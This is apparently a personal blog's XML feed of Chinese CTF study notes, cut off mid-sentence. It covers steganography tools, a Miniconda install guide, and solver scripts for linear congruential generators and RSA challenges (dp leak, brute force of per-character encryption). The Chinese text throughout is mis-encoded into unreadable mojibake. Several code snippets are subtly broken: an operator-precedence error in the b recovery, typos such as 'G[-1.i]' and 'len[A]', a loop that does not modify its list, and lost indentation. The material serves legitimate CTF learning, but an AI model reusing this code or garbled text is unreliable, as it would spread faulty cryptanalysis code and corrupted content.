title="1.JPHSï¼ˆJPHide &amp; JPSeekï¼‰"></a>1.JPHSï¼ˆJPHide &amp; JPSeekï¼‰</h3><p><strong>å·¥å…·ï¼š</strong> jphswin<br><strong>åŸç†ï¼š</strong><br>å°†éšè—ä¿¡æ¯åµŒå…¥åˆ°å›¾ç‰‡çš„DCTç³»æ•°çš„LSBä¸­ã€‚<br><strong>æ“ä½œï¼š</strong><br><code>JPHide:</code>ç”¨äºéšè—ä¿¡æ¯ã€‚<br><code>JPSeek:</code>ç”¨äºæå–JPHideéšè—çš„ä¿¡æ¯ã€‚</p><h2 id="PNGéšå†™"><a href="#PNGéšå†™" class="headerlink" title="PNGéšå†™"></a>PNGéšå†™</h2><h3 id="1-å­—ç¬¦ä¸²"><a href="#1-å­—ç¬¦ä¸²" class="headerlink" title="1.å­—ç¬¦ä¸²"></a>1.å­—ç¬¦ä¸²</h3><p><strong>å·¥å…·ï¼š</strong> <code>010editor</code><br><strong>æ€è·¯ï¼š</strong> æŸ¥çœ‹å›¾ç‰‡çš„å›ºå®šæ¨¡å—æ˜¯å¦æ­£ç¡®ï¼Œå¦‚å¼€å¤´ï¼Œç»“å°¾ï¼ŒIDATï¼ŒCRC<br><strong>å¯èƒ½çš„æƒ…å†µï¼š</strong></p><ul><li>IDATæ”¹å†™ï¼Œå¯¼è‡´å›¾ç‰‡æ˜¾ç¤ºä¸å®Œæ•´</li><li>æ¯ä¸ªCRCä¸­éšè—å¯æ‰“å°å­—ç¬¦</li><li>å›¾ç‰‡ç»“å°¾éšè—å­—ç¬¦ä¸²</li><li>éšè—æ–‡ä»¶ï¼ˆå¯èƒ½ç»è¿‡ä¿®æ”¹ï¼Œè‡ªåŠ¨å·¥å…·æ— æ³•æ£€æµ‹ï¼Œéœ€æ‰‹åŠ¨æŸ¥çœ‹å¹¶æ¢å¤ï¼‰</li></ul><h3 id="2-zsteg"><a href="#2-zsteg" class="headerlink" title="2.zsteg"></a>2.zsteg</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zsteg xxx.png --all<br></code></pre></td></tr></table></figure><h3 id="3-APNGåŠ¨æ€å›¾"><a href="#3-APNGåŠ¨æ€å›¾" class="headerlink" title="3.APNGåŠ¨æ€å›¾"></a>3.APNGåŠ¨æ€å›¾</h3><p>æ˜¯PNGçš„åŠ¨æ€æ‰©å±•ï¼Œç»“åˆäº†PNGå’ŒGIFçš„ä¼˜åŠ¿ã€‚<br><strong>å·¥å…·ï¼š</strong> <a href="https://apngdis.sourceforge.net/">apngdis_gui</a><br><strong>åŠŸèƒ½ï¼š</strong> å°†APNGåŠ¨å›¾åˆ†è§£æˆå¤šå¼ å›¾ç‰‡ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
      <tag>éšå†™</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MInicondaå®‰è£…è®°å½•</title>
    <link href="/2025/04/08/Miniconda%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/04/08/Miniconda%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åšé¢˜çš„æ—¶å€™ç»å¸¸é‡è§Pythonä¸åŒç‰ˆæœ¬ä¸­åº“çš„å†²çªè°ƒæ•´ï¼Œ<br>è¿™é‡Œè®°å½•ä¸€ä¸‹minicondaçš„å®‰è£…è¿‡ç¨‹ã€‚</p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>Minicondaæ˜¯ä¸€æ¬¾è½»é‡çº§çš„åªåŒ…å«pythonå’Œcondaçš„è½¯ä»¶åŒ…ç®¡ç†ç³»ç»Ÿï¼Œé€‚åˆéœ€è¦çµæ´»ç®¡ç†åŒ…å’Œç¯å¢ƒçš„ç”¨æˆ·ã€‚<br>å®ƒèƒ½å¤Ÿå¿«é€Ÿçš„åœ¨ä¸åŒçš„pythonç‰ˆæœ¬ä¹‹é—´åˆ‡æ¢ã€‚</p><h2 id="å®‰è£…ç¯å¢ƒ"><a href="#å®‰è£…ç¯å¢ƒ" class="headerlink" title="å®‰è£…ç¯å¢ƒ"></a>å®‰è£…ç¯å¢ƒ</h2><p>æˆ‘è¿™é‡Œåªè®°å½•æˆ‘æœ¬äººå®‰è£…çš„ç¯å¢ƒ</p><ul><li>Kali Linux</li><li>x86_64æ¶æ„</li></ul><h2 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h2><ul><li>ä¸‹è½½å®‰è£…è„šæœ¬</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O miniconda.sh<br></code></pre></td></tr></table></figure><ul><li>è¿è¡Œè„šæœ¬</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash miniconda.sh<br></code></pre></td></tr></table></figure><p><code>Enter</code>æŸ¥çœ‹åè®®ï¼Œä¸€ç›´<code>Enter</code>ä¸‹ç¿»ï¼Œä¹‹åè¾“å…¥<code>yes</code>æ¥æ”¶åè®®ã€‚<br>ä¸‹ä¸€æ­¥<code>Enter</code>æ¥æ”¶é»˜è®¤å®‰è£…è·¯å¾„<code>~/miniconda3</code>ï¼Œä¹Ÿå¯ä»¥è‡ªå·±è¾“å…¥è‡ªå®šä¹‰è·¯å¾„ã€‚<br>ä¸‹ä¸€æ­¥è¯¢é—®åˆå§‹åŒ–ï¼Œè¾“å…¥<code>yes</code>ï¼ŒåŒæ„åˆå§‹åŒ–ã€‚</p><ul><li>é‡å¯ç”µè„‘</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reboot<br></code></pre></td></tr></table></figure><ul><li>éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda --version<br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å³ä¸ºå®‰è£…æˆåŠŸã€‚</p><h2 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h2><ul><li>åˆ›å»ºæ–°ç¯å¢ƒ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda create -n myenv python=3.9 -y<br></code></pre></td></tr></table></figure><p><code>myenv:</code>è‡ªå®šä¹‰åç§°<br><code>python=3.9:</code>è‡ªå®šä¹‰ç‰ˆæœ¬</p><ul><li>å¼€å¯ç¯å¢ƒ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda activate myenv<br></code></pre></td></tr></table></figure><ul><li>åŒ…ç›¸å…³</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment">#numpyä¸ºä¾‹</span><br>conda <span class="hljs-keyword">install</span> numpy<br>conda update numpy<br>conda <span class="hljs-keyword">remove</span> numpy<br></code></pre></td></tr></table></figure><ul><li>é€€å‡ºç¯å¢ƒ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda deactivate<br></code></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹å·²æœ‰ç¯å¢ƒ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda <span class="hljs-built_in">env</span> list<br></code></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹æ¯ä¸ªç¯å¢ƒå¤§å°</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">du</span> -sh /root/miniconda3/envs/*<br></code></pre></td></tr></table></figure><ul><li>åˆ é™¤ç¯å¢ƒ</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">conda <span class="hljs-built_in">remove</span> -n myenv <span class="hljs-comment">--all</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>conda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CryptoåŸºç¡€ç¯‡-LCG</title>
    <link href="/2025/04/08/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-LCG/"/>
    <url>/2025/04/08/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-LCG/</url>
    
    <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p><strong>LCGï¼š</strong> å³çº¿æ€§åŒä½™ç”Ÿæˆå™¨ï¼Œå½¢å¼ä¸º$X_{n+1}\equiv aX_n+b\mod m$<br>è¯¥é—®é¢˜æ€»ç»“æ¥è¯´çš„å¸¸è§è€ƒç‚¹ï¼š</p><ul><li>æ±‚$X_0(seed)$</li><li>æ±‚$b$</li><li>æ±‚$a$</li><li>æ±‚$m$</li><li>éè¿ç»­</li><li>$X_n$é«˜ä½æ³„éœ²<br>æˆ‘ä»¬æ¥ä¸‹æ¥é€ä¸ªåˆ†ææ±‚è§£ï¼Œ</li></ul><h2 id="æ±‚-X-0-seed"><a href="#æ±‚-X-0-seed" class="headerlink" title="æ±‚$X_0(seed)$"></a>æ±‚$X_0(seed)$</h2><p><strong>æ¡ä»¶ï¼š</strong> å·²çŸ¥$a,b,m,X_n$<br><strong>åˆ†æï¼š</strong><br>$\because X_{n}\equiv aX_{n-1}+b \mod m$<br>$\therefore aX_{n-1}\equiv X_n-b\mod m$<br>$\therefore X_{n-1}\equiv a^{-1}(X_n-b) \mod m$<br>ä¾æ¬¡ç±»æ¨ï¼Œä¾¿å¯ä»¥æ±‚å¾—$X_0$<br><strong>ä»£ç å®ç°ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>a=<br>b=<br>m=<br>X_n=<br><br>inv_a=inverse(a,m)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>X_n=inv_a*(X_n-b) %m<br>seed=X_n<br><span class="hljs-built_in">print</span>(seed)<br></code></pre></td></tr></table></figure><h2 id="æ±‚b"><a href="#æ±‚b" class="headerlink" title="æ±‚b"></a>æ±‚b</h2><p><strong>æ¡ä»¶ï¼š</strong> å·²çŸ¥$a,m,X_n,X_{n+1}$<br><strong>åˆ†æï¼š</strong><br>$\because X_{n+1}\equiv aX_n+b \mod m$<br>$\therefore b\equiv X_{n+1}-aX_n \mod m$<br><strong>ä»£ç å®ç°ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>a=<br>m=<br>X_n=<br>X_n_plus=<br><br>b=X_n_plus-a*X_n %m<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure><h2 id="æ±‚a"><a href="#æ±‚a" class="headerlink" title="æ±‚a"></a>æ±‚a</h2><p><strong>æ¡ä»¶ï¼š</strong> å·²çŸ¥$m,X_n,X_{n+1},X_{n+2}$<br><strong>åˆ†æï¼š</strong><br>$\becauseå·²çŸ¥$<br>$X_{n+2}\equiv aX_{n+1}+b \mod m$<br>$X_{n+1}\equiv aX_n+b \mod m$<br>$\therefore X_{n+2}-X_{n+1}\equiv a(X_{n+1}-X_n) \mod m$<br>$\therefore a\equiv(X_{n+1}-X_n)^{-1}(X_{n+2}-X_{n+1})\mod m$<br><strong>ä»£ç å®ç°ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m=<br>X_n=<br>X_np1=<br>X_np2=<br><br>a=inverse(X_np1-X_n,m)*(X_np2-X_np1) %m<br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><h2 id="æ±‚m"><a href="#æ±‚m" class="headerlink" title="æ±‚m"></a>æ±‚m</h2><p><strong>æ¡ä»¶ï¼š</strong> å·²çŸ¥è‡³å°‘ä¸¤ç»„å››ä¸ªè¿ç»­çš„åºåˆ—å€¼ï¼Œå³æœ€å°‘äº”ä¸ªè¿ç»­å€¼$X_{n-1},X_n,X_{n+1},X_{n+2},X_{n+3}$<br><strong>åˆ†æï¼š</strong><br>$\because X_n\equiv aX_{n-1}+b \mod m$<br>ä»¤$t_n&#x3D;X_{n+1}-X_n$<br>åˆ™$t_{n-1}&#x3D;X_n-X_{n-1}$<br>æ˜“å¾—$t_n\equiv at_{n-1} \mod m$<br>åŒç†$t_{n+1}\equiv at_n \mod m$<br>ç›¸é™¤æ¶ˆå»$a$ï¼Œå†ç§»é¡¹å¾—$t_{n+1}t_{n-1}\equiv t_n^2 \mod m$<br>$\therefore t_{n+1}t_{n-1} - t_n^2 &#x3D; k_1m$<br>åŒç†æœ‰$t_{n+2}t_{n} - t_{n+1}^2 &#x3D; k_2m$<br>$\therefore m&#x3D;gcd(t_{n+1}t_{n-1} - t_n^2,t_{n+2}t_{n} - t_{n+1}^2 )$</p><p><strong>ä»£ç å®ç°ï¼š</strong><br>ç”±äºå®é™…æƒ…å†µä¸­å…¬å› æ•°å¯èƒ½ä¼šå¸¦æœ‰å°å› å­ï¼Œå› æ­¤è‹¥åºåˆ—è¶³å¤Ÿå¤šå¯å¤šè¯•å‡ ç»„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>X_seq=[]<br><br>t=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(X_seq)-<span class="hljs-number">1</span>):<br>t.append(X_seq[i+<span class="hljs-number">1</span>]-X_seq[i])<br><br>T=[]  <span class="hljs-comment">#T_i=T_ip2 * T_i - T_ip1**2 </span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)-<span class="hljs-number">2</span>):<br>T.append(t[i+<span class="hljs-number">2</span>]*t[i]-t[i+<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)<br><br>m=GCD(T[<span class="hljs-number">0</span>],T[<span class="hljs-number">1</span>]) <span class="hljs-comment">#mçš„å€™é€‰å€¼</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(T)):<br>    m=GCD(m,T[i])<br><br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h2 id="éè¿ç»­"><a href="#éè¿ç»­" class="headerlink" title="éè¿ç»­"></a>éè¿ç»­</h2><p><strong>æ¡ä»¶ï¼š</strong> å·²çŸ¥$X_n,X_{n+2}$ç­‰åºåˆ—<br><strong>åˆ†æï¼š</strong><br>$\because X_{n+2}\equiv a(aX_n+b)+b \mod m$<br>$\therefore X_{n+2} \equiv a^2X_n+(a+1)b \mod m$<br>ä»¤$a_1&#x3D;a^2,b_1&#x3D;(a+1)b$<br>$\therefore X_{n+2}\equiv a_1X_n+b_1 \mod m$<br>ä¹‹åæŒ‰æ­£å¸¸LCGæ­¥éª¤ä¾¿å¯ä»¥è§£ç­”å³å¯</p><h2 id="X-n-é«˜ä½-ä½ä½æ³„éœ²"><a href="#X-n-é«˜ä½-ä½ä½æ³„éœ²" class="headerlink" title="$X_n$é«˜ä½&#x2F;ä½ä½æ³„éœ²"></a>$X_n$é«˜ä½&#x2F;ä½ä½æ³„éœ²</h2><p><strong>æ¡ä»¶ï¼š</strong> å·²çŸ¥$X_n$é«˜ä½$H_1,H_2,â€¦,H_nï¼ˆä¸åŸbitä½ç›¸åŒçš„é«˜ä½ï¼‰,a,b,m$ï¼Œæ±‚$L_1$<br><strong>åˆ†æï¼š</strong><br>$\because H_2+L_2\equiv a(H_1+L_1)+b \mod m$<br>$\therefore L_2\equiv aL_1+(aH_1-H_2+b) \mod m$<br>$\therefore L_3\equiv a^2L_1+(a(aH_1-H_2+b)-H_3+b) \mod m$<br>ä»¤$A_i&#x3D;a^i\mod m,B_i&#x3D;aB_{i-1}-H_{i+1}+aH_i+b\mod m$ï¼Œå…¶ä¸­$B_1&#x3D;(aH_1-H_2+b)\mod m$<br>å› æ­¤ï¼Œå¾—åˆ°<br>$L_{i+1}\equiv A_iL_1+B_i \mod m$<br>ä¸‹ä¸€æ­¥ï¼Œæ„é€ æ ¼</p><span>$$(k_1,k_2,...,k_n,L_1,1)\begin{pmatrix}m & 0 & \cdots & 0 & 0 & 0 \\0 & m & \cdots & 0 & 0 & 0 \\\vdots & \vdots & \ddots & \vdots & \vdots & \vdots \\0 & 0 & \cdots & m & 0 & 0 \\A_1 & A_2 & \cdots & A_n & 1 & 0 \\B_1 & B_2 & \cdots & B_n & 0 & K \end{pmatrix} \\=(L_2,L_3,...,L_{n+1},L_1,K)$$</span><p>æ±‚å‡º$L_1$ä¹‹åä¾¿å¯ä»¥åå‘æ±‚å‡º$seed$ï¼Œè¿™é‡Œçš„$K$ä¸$L$çš„bitä½ç›¸åŒã€‚</p><blockquote><p>åˆ°è¿™é‡Œä½ å¯èƒ½ä¹Ÿå·²ç»å‘ç°äº†ï¼Œå·²çŸ¥$X_n$çš„<strong>é«˜ä½</strong>æˆ–è€…<strong>ä½ä½</strong>ï¼Œå…¶æ±‚æ³•æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºåœ¨æˆ‘ä»¬çš„åˆ†æä¸­$H$å’Œ$L$å‡ ä¹æ˜¯å®Œå…¨ç­‰æ•ˆçš„ã€‚</p></blockquote><p><strong>ä»£ç å®ç°ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>a=<br>b=<br>m=<br>h=[]<br>kbits=<br><br>H=[<span class="hljs-number">0</span>]+h<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> H:<br>i &lt;&lt;= kbits<br><br>A=[<span class="hljs-number">1</span>]<br>B=[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(h)-<span class="hljs-number">1</span>):  <br>A.append(a*A[i-<span class="hljs-number">1</span>] % m)  <br>B.append((a*B[i-<span class="hljs-number">1</span>]+a*h[i]+b-h[i+<span class="hljs-number">1</span>]) % m)  <br>  <br>A = A[<span class="hljs-number">1</span>:]  <br>B = B[<span class="hljs-number">1</span>:]<br><br>G = Matrix(ZZ,<span class="hljs-built_in">len</span>(H),<span class="hljs-built_in">len</span>(H))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>[A]):<br>G[i,i] = m<br>G[-<span class="hljs-number">2</span>,i] = A[i]<br>G[-<span class="hljs-number">1.</span>i] = B[i]<br><br>G[-<span class="hljs-number">2</span>,-<span class="hljs-number">2</span>] = <span class="hljs-number">1</span><br>G[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>^kbits<br>L=G.LLL()[<span class="hljs-number">0</span>]<br>L1=L[-<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(L1)<br></code></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>LCGä¹Ÿæ˜¯è®©æ–°æ‰‹å¤´ç–¼çš„ä¸€éƒ¨åˆ†ï¼Œå¸Œæœ›ä½ çœ‹å®Œæˆ‘çš„æ–‡ç« ä¹‹åèƒ½æœ‰æ–°çš„æ”¶è·ï¼Œå¦‚æœæœ‰é—®é¢˜çš„è¯æ¬¢è¿æŒ‡å‡ºï¼Œæœ¬äººä½œä¸ºä¸€åctferèœé¸Ÿï¼Œéš¾å…ä¼šæœ‰äº›å°é”™è¯¯å“’(à¹‘Â´Ú¡ â€˜à¹‘)&#x2F;ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://dexterjie.github.io/2024/07/16/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81-LCG/?highlight=lcg">LCG | DexterJieâ€™Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>LCG</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RSAé¢˜å‹æ±‡æ€»</title>
    <link href="/2025/04/07/RSA%E9%A2%98%E5%9E%8B%E6%B1%87%E6%80%BB/"/>
    <url>/2025/04/07/RSA%E9%A2%98%E5%9E%8B%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p>RSAæ˜¯æ¯ä¸ªæ–°æ‰‹éƒ½è¦è·¨è¶Šçš„ç¬¬ä¸€é“åï¼Œç›¸ä¿¡ä½ ä¹Ÿç»å¸¸é‡è§å¥‡å¥‡æ€ªæ€ªçš„RSAé¢˜å‹ï¼Œè¿™é‡Œè®°å½•äº†æˆ‘é‡è§çš„å„ç§é¢˜å‹ï¼Œéš¾åº¦ä¸åˆ†å…ˆåï¼Œéšæ—¶æ›´æ–°ã€‚</p><h2 id="dpæ³„éœ²-dp-d-mod-p-1"><a href="#dpæ³„éœ²-dp-d-mod-p-1" class="headerlink" title="dpæ³„éœ²(dp&#x3D;d mod p-1)"></a>dpæ³„éœ²(dp&#x3D;d mod p-1)</h2><p><strong>åˆ†æï¼š</strong><br>$\because dp\equiv d \mod p-1$<br>$\therefore edp\equiv ed\mod p-1$<br>$\because ed \equiv 1 \mod (p-1)(q-1)$<br>$\therefore edp+k_1(p-1) &#x3D; 1+k_2(p-1)(q-1)$<br>$\therefore edp&#x3D;(p-1)[k_1+k_2(q-1)]+1$<br>$\because dp&lt;p-1$<br>$\therefore ä»¤A&#x3D;k_1+k_2(q-1)ï¼Œæœ‰e&gt;A$<br>$\therefore A\in (0,e)$<br>$\because è½¬æ¢å¾—p&#x3D;\frac{edp-1}{A}+1$<br>$\therefore éå†Aï¼ˆæ­¤æ—¶Aä¸ç­‰äº0ï¼‰\in(1,e)ï¼Œæ‰¾åˆ°èƒ½æ•´é™¤çš„Aï¼Œè¿›è€Œè®¡ç®—å‡ºp$<br><strong>ä»£ç å®ç°ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#å·²çŸ¥é‡</span><br>dp= <br>n = <br>c = <br>e = <br><br>x = e*dp-<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>Â  Â  <span class="hljs-keyword">if</span> x % i == <span class="hljs-number">0</span>:<br>Â  Â  Â  Â  p_us = x//i +<span class="hljs-number">1</span><br>Â  Â  Â  Â  <span class="hljs-keyword">if</span> n % p_us == <span class="hljs-number">0</span>:<br>Â  Â  Â  Â  Â  Â  p = p_us<br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">break</span><br><br><span class="hljs-comment">#print(p)</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=inverse(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>ans=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="æ˜æ–‡çˆ†ç ´"><a href="#æ˜æ–‡çˆ†ç ´" class="headerlink" title="æ˜æ–‡çˆ†ç ´"></a>æ˜æ–‡çˆ†ç ´</h2><p><strong>å·²çŸ¥ï¼š</strong> $n,e,c_list(æ¯ä¸ªæ˜æ–‡å­—ç¬¦å•ç‹¬åŠ å¯†çš„ç»“æœ)$<br><strong>åˆ†æï¼š</strong> ä½¿ç”¨<code>string.printable</code>æ¥è¡¨ç¤ºæ‰€æœ‰å¯æ‰“å°å­—ç¬¦ï¼Œé€ä¸ªåŠ å¯†æ¯ä¸ªå­—ç¬¦æ¥å¯¹ç…§å¯†æ–‡ã€‚<br><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> string<br><span class="hljs-comment">#çˆ†ç ´</span><br><br>n = <br>c_list = <br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c_list)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string.printable:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">ord</span>(j), e, n) == c_list[i]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found char: <span class="hljs-subst">&#123;j&#125;</span>&quot;</span>)<br>            ans += j<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="å…±æ¨¡æ”»å‡»"><a href="#å…±æ¨¡æ”»å‡»" class="headerlink" title="å…±æ¨¡æ”»å‡»"></a>å…±æ¨¡æ”»å‡»</h2><p><strong>ä»‹ç»ï¼š</strong> ä½¿ç”¨ä¸åŒçš„<code>eï¼ˆå¦‚e1ï¼Œe2ï¼‰</code>æ¥åŠ 